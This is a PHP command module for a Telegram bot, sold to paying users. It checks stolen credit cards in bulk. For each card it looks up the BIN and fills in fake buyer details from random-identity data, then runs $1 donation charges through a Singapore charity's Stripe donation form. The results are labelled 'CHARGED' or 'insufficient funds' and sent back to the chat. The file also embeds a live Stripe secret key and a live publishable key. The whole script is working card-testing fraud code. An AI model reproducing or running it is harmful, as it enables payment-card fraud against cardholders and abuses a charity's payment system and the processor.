<?php 
if ((strpos($message, "/mccn") === 0)||(strpos($message, "!mccn") === 0)||(strpos($message, ".mccn") === 0)){
  if (($role == "OWNER") || ($role == "PREMIUM"))
  {
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$msg = substr($message,5);
    
//$msg = str_replace(" ", "\n", $msg);    
$listas = explode("\n",$msg);
$c = count($listas);
    $c = $c - 1;
    //sendMessage($chatId,$,$messageId);
    if($c>30)
    {
      sendMessage($chatId,"NOT MORE THAN 30 CCS AT A TIME",$messagId);
      exit();
    }
    
$msg = reply_to($chatId,urlencode("
𝗖𝗖𝗦 𝗙𝗢𝗨𝗡𝗗 $c
"),$messageId);
$respon = json_decode($msg, TRUE);
  $message_id_1 = $respon['result']['message_id'];
edit_message($chatId," Startedd....",$message_id_1);
    
    $bln = $c;
while($c>0)
{

$sk ="sk_live_Q0gQC9coYUIiUshIHCdWKBiD";

//------[Randomize Description]------//
$word = array(
1 => 'Dinner Receipt', 
2 => 'Hosting Donations',
3 => 'Accesory Receipt',                
4 => 'Clothes Receipt',                 
5 => 'Food Reciept',
); 
$rnd = array_rand($word);
$dnt = $word[$rnd];
$lista = $listas[$c];
$cc = multiexplode(array(":", "/", " ", "|"), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|"), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|"), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|"), $lista)[3];
$lista = "$cc|$mes|$ano|$cvv";
    
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$bin = substr($cc , 0 , 6);
  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: bins.su';
    $headers[] = 'Origin: http://bins.su';
    $headers[] = 'Referer: http://bins.su/';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
$result = curl_exec($ch);
    $bincap1 = trim(strip_tags(getStr($result, '<td>Bank</td></tr><tr><td>','</td>')));
    $country = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));
    $country2 = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));

    
  if(empty($country))
{
  $country = "US";
  $country2 = "US";
}
if($country == "SG")
{
    $country2 = "US";
}
  //  $country = $country2;
//==================[Randomizing Details]======================//
details:
$get = file_get_contents('https://randomuser.me/api/1.2/?nat='.$country2.'');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
if(empty($name))
{
    $name = "John";
    $last = "gips";
}
if(empty($state))
{
    $country2 = "US";
    goto details;
}
$name = trim($name);
$last = trim($last);
$mail = "$name$last"."@gmail.com";
retry:
//================= [ CURL REQUESTS ] =================//
$start = microtime(true);
#===========[1st REQ]=======#

 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.newlife.org.sg/get-involved/donate/creditcard/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'GET /get-involved/donate/creditcard/ HTTP/2';
$headers[] = 'Host: www.newlife.org.sg';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: none';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$r1 = curl_exec($ch);
$vh = trim(strip_tags(getStr($r1,'{"common":{"form":{"honeypot":{"version_hash":"','"'))); 
$gkey = trim(strip_tags(getStr($r1,"input type='hidden' class='gform_hidden' name='gform_unique_id' value='","'"))); 
$hdval = trim(strip_tags(getStr($r1,"<input type='hidden' class='gform_hidden' name='state_6' value='","'")));
$nonce = trim(strip_tags(getStr($r1,'"create_payment_intent_nonce":"','"'))); 

################################
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'method: POST';
$headers[] = 'path: /v1/payment_methods';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: no-cache';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&guid=466f0bdd-c6be-4e00-98ae-3bc1c9358c8a9bd12a&muid=9d59c32f-a2be-403e-af82-4c0ea32fe30e72d120&sid=27803d5a-b419-48b3-8950-58dad46ccf38e868e8&pasted_fields=number&payment_user_agent=stripe.js%2F4a30826976%3B+stripe-js-v3%2F4a30826976&time_on_page=140825&key=pk_live_51Ht5CEKE4pSdIaSwY7QBSeaC0YH52xcGT0pzSwfNrYdaOPZXuXPhot3IPleNbCNesTVgbmQCeLg1usj5yXS0GD8N00O35yDYKv');
$r2 = curl_exec($ch);
$id = trim(strip_tags(getStr($r2,'"id": "','"')));
 // sendMessage($chatId,$r2,$messageId);
if(empty($id))
{
  $msg = trim(strip_tags(getStr($r2,'"mesaage":"','"')));
  goto fuck;
}
  $l4 = trim(strip_tags(getStr($r2,'"last4": "','"')));
  $crt = trim(strip_tags(getStr($r2,'"created": "','"')));
  $brnd = trim(strip_tags(getStr($r2,'"brand": "','"')));


  #####################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.newlife.org.sg/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /wp-admin/admin-ajax.php HTTP/2';
$headers[] = 'Host: www.newlife.org.sg';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.newlife.org.sg';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.newlife.org.sg/get-involved/donate/creditcard/';
//$headers[] = 'Cookie: PHPSESSID=h0st5b5bctc50l4e6atc8tdvm1; __stripe_mid=9d59c32f-a2be-403e-af82-4c0ea32fe30e72d120; __stripe_sid=27803d5a-b419-48b3-8950-58dad46ccf38e868e8';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D=mastercard&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=DE&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D=20'.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=credit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D='.$l4.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D='.$brnd.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$crt.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=100&feed_id=2');
$r3 = curl_exec($ch);
$pi = trim(strip_tags(getStr($r3,'"id":"','"')));
$scrt = trim(strip_tags(getStr($r3,'"client_secret":"','"')));
  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.newlife.org.sg/get-involved/donate/creditcard/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /get-involved/donate/creditcard/ HTTP/2';
$headers[] = 'Host: www.newlife.org.sg';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
//$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Content-Type: multipart/form-data; boundary=---------------------------20016971038594175122050724319';
$headers[] = 'Content-Length: 2916';
$headers[] = 'Origin: https://www.newlife.org.sg';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.newlife.org.sg/get-involved/donate/creditcard/';
//$headers[] = 'Cookie: PHPSESSID=ugm3kcp0l4q0e8b4etg3nglru2; __stripe_mid=f80a02d3-3a41-46f8-9e35-4fb7a68090c3211160; __stripe_sid=ec056775-0a04-43d3-9f17-93bc9f956a4f42247f';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="input_17"

Donate to New Life Community Services
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="input_15"

$ 1.00
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="input_5"

nexon
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="input_6"

'.$mail.'
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$pi.'","client_secret":"'.$scrt.'","amount":100}
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$l4.'
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="stripe_credit_card_type"

visa
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="input_18"

nexon
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="input_21"


-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="input_22"

Not Applicable
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="is_submit_6"

1
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="gform_submit"

6
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="gform_unique_id"

'.$gkey.'
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="state_6"

'.$hdval.'
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="gform_target_page_number_6"

0
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="gform_source_page_number_6"

1
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="gform_field_values"


-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="ak_hp_textarea"


-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="ak_js"

1684822208070
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="version_hash"

'.$vh.'
-----------------------------20016971038594175122050724319
Content-Disposition: form-data; name="version_hash"

'.$vh.'
-----------------------------20016971038594175122050724319--
');
$rrr = curl_exec($ch); 
    $msg5 = trim(strip_tags(getStr($rrr,'There was a problem with your submission:','.')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.newlife.org.sg/get-involved/donate/creditcard/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /get-involved/donate/creditcard/ HTTP/2';
$headers[] = 'Host: www.newlife.org.sg';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: multipart/form-data; boundary=---------------------------152168584037417303312279960602';
$headers[] = 'Origin: https://www.newlife.org.sg';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.newlife.org.sg/get-involved/donate/creditcard/';
//$headers[] = 'Cookie: PHPSESSID=h0st5b5bctc50l4e6atc8tdvm1; __stripe_mid=9d59c32f-a2be-403e-af82-4c0ea32fe30e72d120; __stripe_sid=27803d5a-b419-48b3-8950-58dad46ccf38e868e8';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="input_17"

Donate to New Life Community Services
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="input_15"

$ 1.00
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="input_5"

nexon
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="input_6"

'.$mail.'
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$pi.'","client_secret":"'.$scrt.'","amount":100,"scaSuccess":true}
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$l4.'
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$brnd.'
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="input_18"

nexon davis
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="input_21"


-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="input_22"

Not Applicable
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="is_submit_6"

1
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="gform_submit"

6
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="gform_unique_id"

'.$gkey.'
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="state_6"

'.$hdval.'
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="gform_target_page_number_6"

0
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="gform_source_page_number_6"

1
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="gform_field_values"


-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="ak_hp_textarea"


-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="ak_js"

1684819930147
-----------------------------152168584037417303312279960602
Content-Disposition: form-data; name="version_hash"

'.$vh.'
-----------------------------152168584037417303312279960602--
');
$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'There was a problem with your submission:','.')));
if(empty($msg))
{
  $msg = $msg5;
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key=pk_live_51Ht5CEKE4pSdIaSwY7QBSeaC0YH52xcGT0pzSwfNrYdaOPZXuXPhot3IPleNbCNesTVgbmQCeLg1usj5yXS0GD8N00O35yDYKv&is_stripe_sdk=false&client_secret='.$scrt.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'GET /v1/payment_intents/'.$pi.'?key=pk_live_51Ht5CEKE4pSdIaSwY7QBSeaC0YH52xcGT0pzSwfNrYdaOPZXuXPhot3IPleNbCNesTVgbmQCeLg1usj5yXS0GD8N00O35yDYKv&is_stripe_sdk=false&client_secret='.$scrt.' HTTP/2';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$pin = curl_exec($ch);  
$msg2 = trim(strip_tags(getStr($pin,'"message": "','"'))); 

    if(isset($msg2))
    {
      $msg = $msg2;
    }
    if(strpos($pin,"three_d_secure_2_source"))
{
  $msg = "3D SECURE CARD";
}
if(strpos($result2, "Security code is incorrect")) 
{

$rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
goto hits;

}
elseif(strpos($pin, "incorrect_cvc")) 
{

$rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
  goto hits;
}
  elseif(strpos($pin, "succeeded")) 
{

$rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
  goto hits;
}
elseif(strpos($result2, "insufficient funds")) {
     $rslt = "
CVV : <code> $lista </code>
𝙄𝙉𝙎𝙐𝙁𝙁𝙄𝘾𝙄𝙀𝙉𝙏 𝙁𝙐𝙉𝘿𝙎 ✅
 ";
  goto hits;
}
  elseif(strpos($result2, "insufficient_funds")) {
 $rslt = "
CVV : <code> $lista </code>
𝙄𝙉𝙎𝙐𝙁𝙁𝙄𝘾𝙄𝙀𝙉𝙏 𝙁𝙐𝙉𝘿𝙎 ✅
 ";
    goto hits;
  }
elseif(strpos($result2, "Thank You for your donation")) {
    $rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
  goto hits;
}
elseif(strpos($result2, "Thank you")) {
   $rslt = "
CHARGED : <code> $lista </code>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @byte_coders ✅
 ";
  goto hits;
}
else {
goto fuck;
}
 //sendMessage ($chatId,$msg,$messageId);
  #------------#
fuck:
    if(isset($msg2))
{
    $msg2 = "$msg";
}
    else
    {
      $msg2 = $msg;
    }
#########################[Responses Show Like]############################
$rslt = "
➜ 𝘾𝘾 : $lista 
➜ 𝙈𝙎𝙂: $msg2 ❌
";
hits:
  $rslts = "$rslts $rslt";
 edit_message($chatId,urlencode("
  $rslts
  "),$message_id_1);
  $c--;

}
edit_message($chatId,urlencode("
  $rslts 
  𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 ✅
  "),$message_id_1);
balancechk($userId,$bln);
  }
  
  else
  {
    reply_to($chatId," 𝙉𝙊𝙏 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ❌",$messageId);
  }
}

  
?>
 